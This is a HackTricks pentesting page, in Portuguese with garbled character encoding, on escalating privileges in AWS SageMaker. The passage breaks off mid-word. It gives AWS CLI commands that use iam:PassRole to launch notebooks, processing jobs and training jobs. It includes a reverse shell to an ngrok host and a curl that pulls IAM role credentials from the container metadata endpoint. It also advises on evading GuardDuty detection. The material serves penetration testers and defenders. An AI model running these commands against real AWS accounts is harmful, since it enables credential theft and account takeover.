# AWS - Sagemaker Privesc

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

</details>

## sagemaker

### `iam:PassRole` , `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

O primeiro passo neste processo de ataque √© **identificar uma fun√ß√£o que confie no SageMaker para assumi-la** (sagemaker.amazonaws.com). Uma vez feito isso, podemos executar o seguinte comando para criar um novo notebook com essa fun√ß√£o anexada:

```
aws sagemaker create-notebook-instance --notebook-instance-name example \
    --instance-type ml.t2.medium \
    --role-arn arn:aws:iam::ACCOUNT-ID:role/service-role/AmazonSageMaker-ExecutionRole-xxxxxx
```

Se for bem-sucedido, voc√™ receber√° o **ARN da nova inst√¢ncia do notebook** na resposta da AWS. Isso levar√° **alguns minutos** para ser conclu√≠do, mas assim que for conclu√≠do, podemos executar o seguinte comando para obter uma URL pr√©-assinada para obter **acesso √† inst√¢ncia do notebook por meio de nosso navegador da web**. Existem potencialmente outras maneiras de obter acesso, mas esta √© uma √∫nica permiss√£o e uma √∫nica chamada de API, ent√£o parecia simples.

```bash
aws sagemaker create-presigned-notebook-instance-url \
    --notebook-instance-name <name>
```

Se esta inst√¢ncia estiver totalmente configurada, esta chamada de API retornar√° uma **URL assinada que podemos visitar** em nosso navegador para acessar a inst√¢ncia. Uma vez na p√°gina Jupyter em meu navegador, clicarei em "Open JupyterLab" no canto superior direito, que pode ser visto na captura de tela a seguir.

![](<../../../.gitbook/assets/image (15) (1).png>)

Na pr√≥xima p√°gina, role at√© o final na guia ‚ÄúLauncher‚Äù. Na se√ß√£o ‚ÄúOutros‚Äù, clique no bot√£o ‚ÄúTerminal‚Äù, que pode ser visto aqui.

![](<../../../.gitbook/assets/image (27).png>)

A partir do terminal, temos algumas op√ß√µes, uma das quais seria apenas **usar o AWS CLI**. A outra op√ß√£o seria **entrar em contato com o servi√ßo de metadados do EC2** para as credenciais da fun√ß√£o IAM diretamente e exfiltr√°-las.

GuardDuty pode vir √† mente ao ler ‚Äúexfiltr√°-las‚Äù acima, no entanto, na verdade n√£o precisamos nos preocupar com o GuardDuty aqui. A descoberta relacionada do GuardDuty √© [‚ÄúUnauthorizedAccess:IAMUser/InstanceCredentialExfiltration‚Äù](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_unauthorized.html#unauthorized11), que alertar√° se as credenciais de uma fun√ß√£o forem roubadas de uma inst√¢ncia EC2 e usadas em outro lugar. Felizmente para n√≥s, esta inst√¢ncia EC2 na verdade n√£o est√° em nossa conta, mas sim √© uma **inst√¢ncia EC2 gerenciada hospedada em uma conta de propriedade da AWS**. Isso significa que **podemos exfiltrar essas credenciais e n√£o nos preocupar em acionar** os detectores do GuardDuty de nosso alvo.

**Impacto potencial:** Privesc para a fun√ß√£o de servi√ßo sagemaker especificada.

### `sagemaker:CreatePresignedNotebookInstanceUrl`

Semelhante ao exemplo anterior, se os **notebooks Jupyter j√° estiverem em execu√ß√£o** nele e voc√™ puder list√°-los com sagemaker:ListNotebookInstances (ou descobri-los de qualquer outra maneira). Voc√™ pode **gerar uma URL para eles, acess√°-los e roubar as credenciais conforme indicado na t√©cnica anterior**.

```bash
aws sagemaker create-presigned-notebook-instance-url \
    --notebook-instance-name <name>
```

**Impacto potencial:** Privesc para a fun√ß√£o de servi√ßo sagemaker anexada.

### `sagemaker:CreateProcessingJob,iam:PassRole`

Um atacante com essas permiss√µes pode fazer com que o **sagemaker execute um job de processamento** com uma fun√ß√£o sagemaker anexada a ele. O atacante pode indicar a defini√ß√£o do cont√™iner que ser√° executado em uma **inst√¢ncia da conta ECS gerenciada pela AWS**, e **roubar as credenciais da fun√ß√£o IAM anexada**.

```bash
# Eu carreguei uma imagem docker python no ECR
aws sagemaker create-processing-job \
    --processing-job-name privescjob \
    --processing-resources '{"ClusterConfig": {"InstanceCount": 1,"InstanceType": "ml.t3.medium","VolumeSizeInGB": 50}}' \
    --app-specification "{\"ImageUri\":\"<id>.dkr.ecr.eu-west-1.amazonaws.com/python\",\"ContainerEntrypoint\":[\"sh\", \"-c\"],\"ContainerArguments\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14920 0>&1\\\"\"]}" \
    --role-arn <sagemaker-arn-role>

# Em meus testes, levou 10 minutos para receber o shell
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" #Para obter as credenciais
```

**Impacto potencial:** Privesc para a fun√ß√£o de servi√ßo sagemaker especificada.

### `sagemaker:CreateTrainingJob`, `iam:PassRole`

Um atacante com essas permiss√µes poder√° criar um job de treinamento, **executando um cont√™iner arbitr√°rio** nele com uma **fun√ß√£o anexada** a ele. Portanto, o atacante poder√° roubar as credenciais da fun√ß√£o.

{% hint style="warning" %}
Este cen√°rio √© mais dif√≠cil de explor